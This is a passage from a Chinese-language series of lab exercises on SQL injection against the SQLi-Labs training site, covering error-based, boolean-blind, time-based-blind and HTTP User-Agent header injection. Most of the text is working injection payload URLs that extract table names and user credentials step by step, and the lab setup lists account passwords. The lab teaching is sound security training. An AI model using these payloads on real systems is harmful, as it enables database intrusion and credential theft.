x：按照（by）一定的规则（x）进行分组；报错原理：floor()函数与groupby、rand()联用时，如果临时表中没有该主键，则在插入前会再计算一次rand()，然后再由groupby将计算出来的主键直接插入到临时表格中，导致主键重复报错，错误信息如：Duplicate entry ‘…’ for key‘group_key’。 实验步骤本实验的目标是：以SQLi-Labs网站的Less-1为入口，借助floor()函数与rand()、count()、group by的联用，利用基于报错的注入方式获取SQLi-Labs网站的登录用户名和密码。 1 访问SQLi-Labs网站在攻击机Pentest-Atk打开FireFox浏览器，并访问靶机A-SQLi-Labs上的SQLi-Labs网站Less-1。访问的URL为： 1http://[靶机IP]/sqli-labs/Less-1/ (注意大小写) 登录后，根据网页提示，先给定一个GET参数，即： 1http://[靶机IP]/sqli-labs/Less-1/?id=1 此时页面显示id&#x3D;1的用户名Dump、密码Dump。 说明：本实验环境中FireFox浏览器已预安装Hackbar插件，在FireFox界面按下键盘上的F9键启用或停用（本实验环境中默认为启用状态）。建议在注入过程中用Hackbar插件来调整payload参数！ 2 寻找注入点分别使用以下3条payload寻找注入点及判断注入点的类型： 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; 运行后报错！ 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and &#x27;1&#x27;=&#x27;1 运行后正常显示！ 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and &#x27;1&#x27;=&#x27;2 运行后未正常显示！ 由上述结果可以判断，网站存在字符型注入点。 3 获取网站当前所在数据库的库名使用以下payload获取网站当前所在数据库的库名： 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+ 显示结果为security。注意：请忽略后面的1。 4 获取数据库security的全部表名使用以下payload获取数据库security的表名： 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+ 显示security库中的第1张表的名字为emails。 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+ 显示security库中的第2张表的名字为referers。 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 2,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+ 显示security库中的第3张表的名字为uagents。 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+ 显示security库中的第4张表的名字为users。 … 以上显示结果中，第4张表users当中可能存放着网站用户的基本信息。 5 获取users表的全部字段名使用以下payload获取users表的字段名： 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+ 显示users表中的第1个字段名字为id。 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+ 显示users表中的第2个字段名字为username。 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 2,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+ 显示users表中的第3个字段名字为password。 … 综合以上显示结果，users表中有id、username和password三个字段。 6 获取users表id、username和password字段的全部值。由于users表中存放着多组用户名和密码的数据，而每次只能显示一组数据，我们可以通过limit M,N的方式逐条显示，如 （1）显示第1组数据 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and (select 1 from (select count(*),concat((select concat_ws(&#x27;,&#x27;,id,username,password) from security.users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+ 显示结果为Dump，Dump。 （2）显示第2组数据 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and (select 1 from (select count(*),concat((select concat_ws(&#x27;,&#x27;,id,username,password) from security.users limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+ 显示结果为Angelina，I-kill-you。 （3）显示第3组数据 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and (select 1 from (select count(*),concat((select concat_ws(&#x27;,&#x27;,id,username,password) from security.users limit 2,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+ 显示结果为Dummy，p@ssword。 … 以此类推，可通过修改limit后面的参数，将users表中存放的所有用户信息全部暴露出来。实验至此结束。 实验总结本次实验，成功实现了对存在字符型GET注入点的网站的手工SQL注入，熟悉了floor()、rand()、count()、group by的用法，掌握了基于报错的注入方法和流程。 SQL注入-基于布尔的盲注实验目的了解布尔盲注技术的运用场景及条件，熟悉length()、substr()、ascii()等函数的用法，掌握基于布尔的盲注基本流程。 实验环境攻击机：Pentest-Atk（1）操作系统：Windows 10 （2）安装的应用软件：Sqlmap、Burpsuite、FireFox浏览器插件Hackbar、FoxyProxy等 （3）登录账号密码：操作系统帐号Administrator，密码Sangfor!7890 靶机：A-SQLi-Labs（1）操作系统：CentOS 7 （2）安装的应用软件：Apache、MySQL(MariaDB)、PHP；DVWA、SQLi-Labs、Webug3.0漏洞网站环境 （3）登录账号密码：操作系统帐号root，密码Sangfor!7890 实验原理（1）关于布尔盲注 某些场合下，页面返回的结果只有两种（正常或错误）。通过构造SQL判断语句，查看页面的返回结果（True or False）来判断哪些SQL判断条件成立，通过此来获取数据库中的数据。 （2）一些功能函数的说明 length(str)：返回字符串（str）的长度，以字节为单位。substr(str,pos,len)：从指定的位置（pos）开始，截取并返回字符串（str）指定长度（len）的子串。ascii(str)：返回字符串（str）最左边字符的ASCII码。 实验步骤本实验的目标是：以SQLi-Labs网站的Less-8为入口，利用基于布尔的盲注方式获取SQLi-Labs网站的登录用户名和密码。 1 访问SQLi-Labs网站在攻击机Pentest-Atk打开FireFox浏览器，并访问靶机A-SQLi-Labs上的SQLi-Labs网站Less-8。访问的URL为： 1http://[靶机IP]/sqli-labs/Less-8/ (注意大小写) 登录后，根据网页提示，给定一个?id&#x3D;1的参数，即： 1http://[靶机IP]/sqli-labs/Less-8/?id=1 此时页面显示信息为You are in…，显示状态为True。 如果给定一个?id&#x3D;-1的参数，即： 1http://[靶机IP]/sqli-labs/Less-8/?id=-1 此时页面显示信息为空，显示状态为False。 可以继续给定不同的id参数进行尝试，发现页面的显示结果只有两种：True或False。由此可以判断，这是一种典型的布尔盲注场景！ 说明：本实验环境中FireFox浏览器已预安装Hackbar插件，在FireFox界面按下键盘上的F9键启用或停用（本实验环境中默认为启用状态）。建议在注入过程中用Hackbar插件来调整payload参数！ 2 寻找注入点分别使用以下3条payload寻找注入点及判断注入点的类型： 1http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; 运行后页面显示为False！ 1http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and &#x27;1&#x27;=&#x27;1 运行后页面显示为True！ 1http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and &#x27;1&#x27;=&#x27;2 运行后页面显示为False！ 由上述结果可以判断，网站存在字符型注入点。 3 盲猜网站当前所在数据库的库名长度假设当前所在数据库的库名长度为N，尝试使用判断语句length(database())&#x3D;M，不断变化M的值去猜测，如果M不等于N，页面应该显示为False；如果M等于N，页面应该显示为True。 例如执行如下payload： 1http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and length(database())=7--+ 显示结果为False，说明网站当前所在数据库的库名长度不是7个字符！ 1http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and length(database())=8--+ 显示结果为True，说明网站当前所在数据库的库名长度为8个字符！ 4 盲猜网站当前所在数据库的库名字符串本步骤通过逐个字母盲猜的方式进行。 假设库名字符串的第1个字母为a，那么条件判断语句 substr(库名字符串,1,1)&#x3D;‘a’ 以及 ascii(substr(库名字符串,1,1))&#x3D;97 返回的结果均应为True（小写字母a的ASCII码为97）； 假设库名字符串的第2个字母为b，那么条件判断语句 substr(库名字符串,2,1))&#x3D;‘b’ 以及 ascii(substr(库名字符串,2,1))&#x3D;98 返回的结果均应为True（小写字母b的ASCII码为98）； … 以此类推。 猜测库名的第1个字母： 123http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and substr(database(),1,1)=&#x27;s&#x27;--+或http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and ascii(substr(database(),1,1))=115--+ 库名的第1个字母为s。 猜测库名的第2个字母： 123http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and substr(database(),2,1)=&#x27;e&#x27;--+或http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and ascii(substr(database(),2,1))=101--+ 库名的第2个字母为e。 … 以此类推，最终得到的字符串结果为security。 5 盲猜数据库security的全部表名（1）猜测第1张表的表名 猜测第1张表的表名的第1个字符： 123http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1)=&#x27;e&#x27;--+或http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))=101--+ 第1张表的表名的第1个字符为e。 猜测第1张表的表名的第2个字符： 123http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),2,1)=&#x27;m&#x27;--+或http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),2,1))=109--+ 第1张表的表名的第2个字符为m。 … 以此类推，得到security库中的第1张表的名字为emails。 （2）猜测第2张表的表名 猜测第2张表的表名的第1个字符： 123http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 1,1),1,1)=&#x27;r&#x27;--+或http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 1,1),1,1))=114--+ 第2张表的表名的第1个字符为r。 猜测第2张表的表名的第2个字符： 123http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 1,1),2,1)=&#x27;e&#x27;--+或http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 1,1),2,1))=101--+ 第2张表的表名的第2个字符为e。 … 以此类推，得到security库中的第2张表的名字为referers。 依据上述方法，通过不断变换limit和substr()函数中的参数，可以最终得到security库中所有表的表名：emails、referers、uagents和users。其中，第4张表users当中可能存放着网站用户的基本信息。 6 盲猜users表的全部字段名（1）猜测第1个字段名 猜测第1个字段名的第1个字符： 123http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1)=&#x27;i&#x27;--+或http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))=105--+ 第1个字段名的第1个字符为i。 猜测第1个字段名的第2个字符： 123http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),2,1)=&#x27;d&#x27;--+或http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),2,1))=100--+ 第1个字段名的第2个字符为d。 … 以此类推，得到users表中的第1个字段名为id。 依据上述方法，通过不断变换limit和substr()函数中的参数，可以最终得到users表中所有字段名：id、username和password。 7 盲猜users表username和password字段的全部值（1）猜测第1组数据 猜测第1组数据的第1个字符： 123http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and substr((select concat_ws(&#x27;,&#x27;,username,password) from security.users limit 0,1),1,1)=&#x27;D&#x27;--+或http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and ascii(substr((select concat_ws(&#x27;,&#x27;,username,password) from security.users limit 0,1),1,1))=68--+ 第1组数据的第1个字符为D。 猜测第1组数据的第2个字符： 123http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and substr((select concat_ws(&#x27;,&#x27;,username,password) from security.users limit 0,1),2,1)=&#x27;u&#x27;--+或http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and ascii(substr((select concat_ws(&#x27;,&#x27;,username,password) from security.users limit 0,1),2,1))=117--+ 第1组数据的第2个字符为u。 … 以此类推，得到第1组数据为“Dump,Dump”。 注意：字符串中的逗号（,）也是需要进行猜测比对的！例如第1组数据的第5个字符： 123http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and substr((select concat_ws(&#x27;,&#x27;,username,password) from security.users limit 0,1),5,1)=&#x27;,&#x27;--+或http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and ascii(substr((select concat_ws(&#x27;,&#x27;,username,password) from security.users limit 0,1),5,1))=44--+ （2）猜测第2组数据 猜测第2组数据的第1个字符： 123http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and substr((select concat_ws(&#x27;,&#x27;,username,password) from security.users limit 1,1),1,1)=&#x27;A&#x27;--+或http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and ascii(substr((select concat_ws(&#x27;,&#x27;,username,password) from security.users limit 1,1),1,1))=65--+ 第2组数据的第1个字符为A。 猜测第2组数据的第2个字符： 123http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and substr((select concat_ws(&#x27;,&#x27;,username,password) from security.users limit 1,1),2,1)=&#x27;n&#x27;--+或http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and ascii(substr((select concat_ws(&#x27;,&#x27;,username,password) from security.users limit 1,1),2,1))=110--+ 第2组数据的第2个字符为n。 … 以此类推，得到第2组数据为“Angelina,I-kill-you”。 依据上述方法，通过不断变换limit和substr()函数中的参数，可以最终得到users表中username和password字段的全部值。实验至此结束。 实验总结本次实验，成功实现了对存在字符型GET注入点的网站的手工SQL注入，熟悉了length()、substr()等函数的用法，掌握了基于布尔的盲注方法和流程。 SQL注入-基于时间的盲注实验目的了解延时盲注技术的运用场景及条件，熟悉length()、substr()、ascii()、sleep()、if()等函数的用法，掌握基于时间的盲注基本流程。 实验环境攻击机：Pentest-Atk（1）操作系统：Windows 10 （2）安装的应用软件：Sqlmap、Burpsuite、FireFox浏览器插件Hackbar、FoxyProxy等 （3）登录账号密码：操作系统帐号Administrator，密码Sangfor!7890 靶机：A-SQLi-Labs（1）操作系统：CentOS 7 （2）安装的应用软件：Apache、MySQL(MariaDB)、PHP；DVWA、SQLi-Labs、Webug3.0漏洞网站环境 （3）登录账号密码：操作系统帐号root，密码Sangfor!7890 实验原理（1）关于时间（延时）盲注 某些场合下，页面只有一种返回结果，使用具有延时功能的函数sleep()、benchmark()等，通过判断这些函数是否正常执行来获取数据库中的数据。 （2）一些功能函数的说明 length(str)：返回字符串（str）的长度，以字节为单位。substr(str,pos,len)：从指定的位置（pos）开始，截取并返回字符串（str）指定长度（len）的子串。ascii(str)：返回字符串（str）最左边字符的ASCII码。if(expr1,expr2,expr3)：条件判断函数，expr1为true则返回expr2，expr1为false则返回expr3。sleep(N)：让语句延迟执行一段时间（N秒），执行成功后返回0。benchmark(count,expr)：让expr执行count次，执行成功后返回0。 实验步骤本实验的目标是：以SQLi-Labs网站的Less-9为入口，利用基于时间的盲注方式获取SQLi-Labs网站的登录用户名和密码。 1 访问SQLi-Labs网站在攻击机Pentest-Atk打开FireFox浏览器，并访问靶机A-SQLi-Labs上的SQLi-Labs网站Less-9。访问的URL为： 1http://[靶机IP]/sqli-labs/Less-9/ (注意大小写) 登录后，根据网页提示，给定一个?id&#x3D;1的参数，即： 1http://[靶机IP]/sqli-labs/Less-9/?id=1 此时页面显示信息为You are in…。 如果给定一个?id&#x3D;-1的参数，即： 1http://[靶机IP]/sqli-labs/Less-9/?id=-1 此时页面显示信息仍然为You are in…。 可以继续给定不同的id参数进行尝试，发现页面的显示结果只有一种：You are in…。由此可以判断，这是一种典型的时间（延时）盲注场景！ 说明：本实验环境中FireFox浏览器已预安装Hackbar插件，在FireFox界面按下键盘上的F9键启用或停用（本实验环境中默认为启用状态）。建议在注入过程中用Hackbar插件来调整payload参数！ 2 寻找注入点使用sleep()函数判断注入点的类型： 1http://[靶机IP]/sqli-labs/Less-9/?id=1 and sleep(5)--+ sleep(5)未执行，页面无明显延迟。 1http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and sleep(5)--+ sleep(5)成功执行，页面有明显延迟！ 由上述结果可以判断，网站存在字符型注入点。 3 盲猜网站当前所在数据库的库名长度假设当前所在数据库的库名长度为N，尝试使用判断语句if((length(database())&#x3D;M),sleep(5),1)，不断变化M的值去猜测，如果M等于N，此时sleep(5)会成功执行，页面应该会有明显延迟。 例如执行如下payload： 1http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(length(database())=7,sleep(5),1)--+ 页面无明显延迟，说明网站当前所在数据库的库名长度不是7个字符。 1http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(length(database())=8,sleep(5),1)--+ 页面有明显延迟，说明网站当前所在数据库的库名长度为8个字符！ 4 盲猜网站当前所在数据库的库名字符串本步骤通过逐个字母盲猜的方式进行。 假设库名字符串的第1个字母为a，那么条件判断语句 if(substr(库名字符串,1,1)&#x3D;‘a’,sleep(5),1) 以及if(ascii(substr(库名字符串,1,1))&#x3D;97,sleep(5),1) 中，sleep(5)能成功执行，页面应该会有明显延迟； 假设库名字符串的第2个字母为b，那么条件判断语句 if(substr(库名字符串,2,1)&#x3D;‘b’,sleep(5),1) 以及if(ascii(substr(库名字符串,2,1))&#x3D;98,sleep(5),1) 中，sleep(5)能成功执行，页面应该会有明显延迟； … 以此类推。 猜测库名的第1个字母： 123http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(substr(database(),1,1)=&#x27;s&#x27;,sleep(5),1)--+或http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(ascii(substr(database(),1,1))=115,sleep(5),1)--+ 页面有明显延迟，证明库名的第1个字母为s，猜测正确。 猜测库名的第2个字母： 123http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(substr(database(),2,1)=&#x27;e&#x27;,sleep(5),1)--+或http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(ascii(substr(database(),2,1))=101,sleep(5),1)--+ 页面有明显延迟，证明库名的第2个字母为e，猜测正确。 … 以此类推，最终得到的字符串结果为security。 5 盲猜数据库security的全部表名（1）猜测第1张表的表名 猜测第1张表的表名的第1个字符： 123http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1)=&#x27;e&#x27;,sleep(5),1)--+或http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))=101,sleep(5),1)--+ 页面有明显延迟，证明第1张表的表名的第1个字符为e，猜测正确。 猜测第1张表的表名的第2个字符： 123http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),2,1)=&#x27;m&#x27;,sleep(5),1)--+或http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),2,1))=109,sleep(5),1)--+ 页面有明显延迟，证明第1张表的表名的第2个字符为m，猜测正确。 … 以此类推，得到security库中的第1张表的名字为emails。 （2）猜测第2张表的表名 猜测第2张表的表名的第1个字符： 123http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 1,1),1,1)=&#x27;r&#x27;,sleep(5),1)--+或http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 1,1),1,1))=114,sleep(5),1)--+ 页面有明显延迟，证明第2张表的表名的第1个字符为r，猜测正确。 猜测第2张表的表名的第2个字符： 123http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 1,1),2,1)=&#x27;e&#x27;,sleep(5),1)--+或http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 1,1),2,1))=101,sleep(5),1)--+ 页面有明显延迟，证明第2张表的表名的第2个字符为e，猜测正确。 … 以此类推，得到security库中的第2张表的名字为referers。 依据上述方法，通过不断变换limit和substr()函数中的参数，可以最终得到security库中所有表的表名：emails、referers、uagents和users。其中，第4张表users当中可能存放着网站用户的基本信息。 6 盲猜users表的全部字段名（1）猜测第1个字段名 猜测第1个字段名的第1个字符： 123http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1)=&#x27;i&#x27;,sleep(5),1)--+或http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))=105,sleep(5),1)--+ 页面有明显延迟，证明第1个字段名的第1个字符为i，猜测正确。 猜测第1个字段名的第2个字符： 123http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),2,1)=&#x27;d&#x27;,sleep(5),1)--+或http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),2,1))=100,sleep(5),1)--+ 页面有明显延迟，证明第1个字段名的第2个字符为d，猜测正确。 … 以此类推，得到users表中的第1个字段名为id。 依据上述方法，通过不断变换limit和substr()函数中的参数，可以最终得到users表中所有字段名：id、username和password。 7 盲猜users表username和password字段的全部值（1）猜测第1组数据 猜测第1组数据的第1个字符： 123http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(substr((select concat_ws(&#x27;,&#x27;,username,password) from security.users limit 0,1),1,1)=&#x27;D&#x27;,sleep(5),1)--+或http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(ascii(substr((select concat_ws(&#x27;,&#x27;,username,password) from security.users limit 0,1),1,1))=68,sleep(5),1)--+ 页面有明显延迟，证明第1组数据的第1个字符为D，猜测正确。 猜测第1组数据的第2个字符： 123http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(substr((select concat_ws(&#x27;,&#x27;,username,password) from security.users limit 0,1),2,1)=&#x27;u&#x27;,sleep(5),1)--+或http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(ascii(substr((select concat_ws(&#x27;,&#x27;,username,password) from security.users limit 0,1),2,1))=117,sleep(5),1)--+ 页面有明显延迟，证明第1组数据的第2个字符为u，猜测正确。 … 以此类推，得到第1组数据为“Dump,Dump”。 注意：字符串中的逗号（,）也是需要进行猜测比对的！例如第1组数据的第5个字符： 123http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(substr((select concat_ws(&#x27;,&#x27;,username,password) from security.users limit 0,1),5,1)=&#x27;,&#x27;,sleep(5),1)--+或http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(ascii(substr((select concat_ws(&#x27;,&#x27;,username,password) from security.users limit 0,1),5,1))=44,sleep(5),1)--+ （2）猜测第2组数据 猜测第2组数据的第1个字符： 123http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(substr((select concat_ws(&#x27;,&#x27;,username,password) from security.users limit 1,1),1,1)=&#x27;A&#x27;,sleep(5),1)--+或http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(ascii(substr((select concat_ws(&#x27;,&#x27;,username,password) from security.users limit 1,1),1,1))=65,sleep(5),1)--+ 页面有明显延迟，证明第2组数据的第1个字符为A，猜测正确。 猜测第2组数据的第2个字符： 123http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(substr((select concat_ws(&#x27;,&#x27;,username,password) from security.users limit 1,1),2,1)=&#x27;n&#x27;,sleep(5),1)--+或http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(ascii(substr((select concat_ws(&#x27;,&#x27;,username,password) from security.users limit 1,1),2,1))=110,sleep(5),1)--+ 页面有明显延迟，证明第2组数据的第2个字符为n，猜测正确。 … 以此类推，得到第2组数据为“Angelina,I-kill-you”。 依据上述方法，通过不断变换limit和substr()函数中的参数，可以最终得到users表中username和password字段的全部值。实验至此结束。 实验总结本次实验，成功实现了对存在字符型GET注入点的网站的手工SQL注入，熟悉了length()、substr()、ascii()、sleep()、if()等函数的用法，掌握了基于时间的盲注方法和流程。 SQL注入-HTTP头部注入1实验目的理解HTTP头部字段User-Agent、Referer、Cookie、X-Forwarded-For等的含义和作用，掌握HTTP头部注入的原理、方法及基本流程。 实验环境攻击机：Pentest-Atk（1）操作系统：Windows 10 （2）安装的应用软件：Sqlmap、Burpsuite、FireFox浏览器插件Hackbar、FoxyProxy等 （3）登录账号密码：操作系统帐号Administrator，密码Sangfor!7890 靶机：A-SQLi-Labs（1）操作系统：CentOS 7 （2）安装的应用软件：Apache、MySQL(MariaDB)、PHP；DVWA、SQLi-Labs、Webug3.0漏洞网站环境 （3）登录账号密码：操作系统帐号root，密码Sangfor!7890 实验原理有时候，后台开发人员为了验证客户端HTTP Header（比如常用的Cookie验证等）或者通过HTTPHeader头信息获取客户端的一些信息（比如User-Agent、Accept字段等），会对客户端HTTPHeader进行获取并使用SQL语句进行处理，如果此时没有足够的安全考虑，就可能导致基于HTTP Header的注入漏洞。常见的HTTP Header注入类型包括Cookie注入、Referer注入、User-Agent注入、XFF注入等。 实验步骤本实验的目标是：以SQLi-Labs网站的Less-18为入口，利用报错注入的方式实施SQL注入，获取SQLi-Labs网站的登录用户名和密码。 1 访问SQLi-Labs网站在攻击机Pentest-Atk打开FireFox浏览器，并访问靶机A-SQLi-Labs上的SQLi-Labs网站Less-11。访问的URL为： 1http://[靶机IP]/sqli-labs/Less-18/ (注意大小写) 2 利用Burpsuite工具抓包（1）启动Burpsuite 在攻击机Pentest-Atk的桌面文件夹Burp中，鼠标左键双击BURP.cmd程序，启动Burpsuite。 （2）设置Burpsuite的代理服务端口 在Burpsuite软件界面上选择选项卡“Proxy”-&gt;“Options”，在Proxy Listeners模块下，将Burpsuite的代理服务端口设置为8080（此为Burpsuite默认的服务端口）。 （3）开启Burpsuite的代理拦截功能 在Burpsuite软件界面上选择选项卡“Proxy”-&gt;“Intercept”，将拦截开关按钮的状态设置为“Intercept is on”。 注意：上述设置完成之后，不要关闭Burpsuite！ （4）设置Firefox代理 回到FireFox浏览器界面，鼠标右键单击浏览器地址栏右方的FoxyProxy插件图标按钮，在弹出的菜单中选择“为全部URLs启用代理服务器127.0.0.1:8080”: 代理设置成功后，FoxyProxy插件图标会变成蓝色。 （5）利用Burpsuite工具拦截HTTP请求包 在FireFox浏览器访问的Less-18登录验证界面，输入用户名admin、密码admin，然后点击Submit按钮， 此时Burpsuite会拦截到HTTP请求包： （6）将Burpsuite工具拦截到的HTTP请求包发送至Repeater模块。 选中拦截到的HTTP请求包全部内容，单击鼠标右键，在弹出的菜单中选择“Send to Repeater”，将其发送给Burpsuite的Repeater模块。 发送成功后，在Burpsuite的Repeater选项卡下能够看到刚刚拦截的HTTP请求包内容。 后续的步骤中，可以在Repeater选项卡下的Request栏中设置注入的payload，设置完成后点击Send按钮发送，并在Response栏中观察目标服务器的响应。 3 寻找注入点在原始HTTP请求包的头部字段User-Agent末尾添加单引号，即使用如下payload： 1User-Agent:Mozilla/5.0......Firefox/46.0&#x27; 发现服务器端报错！ 在原始HTTP请求包的头部字段User-Agent末尾添加如下符号，使用如下payload： 1User-Agent:Mozilla/5.0......Firefox/46.0&#x27;,&#x27;&#x27;,&#x27;&#x27;)# 服务器端未报错！ 由此可以判断，目标网站在POST参数处存在字符型注入点。 注：如果在服务器端（靶机）上查看Less-18的php代码，会发现其中存在这样一段代码： 1$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;; 这也是一种基于Insert的注入场景。 4 获取网站当前所在数据库的库名使用以下payload获取网站当前所在数据库的库名： 1User-Agent:Mozilla/5.0......Firefox/46.0&#x27; and extractvalue(1,concat(&#x27;~&#x27;,database())),&#x27;&#x27;,&#x27;&#x27;)# 显示结果为security。 5 获取数据库security的全部表名使用以下payload获取数据库security的全部表名： 1User-Agent:Mozilla/5.0......Firefox/46.0&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where 